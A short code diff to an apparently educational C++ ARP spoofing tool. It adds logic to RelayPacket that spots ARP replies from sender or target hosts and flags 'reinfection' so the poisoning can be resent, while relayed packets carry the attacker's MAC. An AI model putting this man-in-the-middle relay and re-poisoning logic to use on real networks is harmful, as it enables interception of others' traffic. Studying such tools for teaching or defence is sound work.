@@ -94,6 +94,7 @@ int Spoof::RelayPacket(pcap_t* pcap) {
     struct pcap_pkthdr* header;
     const u_char* packet;
     int result = 0;
+    bool isArp = false;
         
     int res = pcap_next_ex(pcap, &header, &packet);
 
@@ -118,6 +119,7 @@ int Spoof::RelayPacket(pcap_t* pcap) {
             struct ArpHdr *arp = (struct ArpHdr *) (cpPacket + ethLength);
             sip = ntohl(Ip(arp->sip()));
             tip = ntohl(Ip(arp->tip()));
+            isArp= true;
             break;
         }
             
@@ -140,6 +142,14 @@ int Spoof::RelayPacket(pcap_t* pcap) {
         eth->dmac_ = senderMac_;
         eth->smac_ = attackerMac_;
         pcap_sendpacket(pcap, cpPacket, header->len);
+    }
+    else if (isArp && (eth->smac_ == senderMac_) && (eth->dmac_ == attackerMac_) ) {
+        //reinfection
+        result = 1;
+    }
+    else if (isArp && (eth->smac_ == targetMac_) && (eth->dmac_ == attackerMac_) ) {
+        //reinfection
+        result = 1;
     }
 
     free(cpPacket);
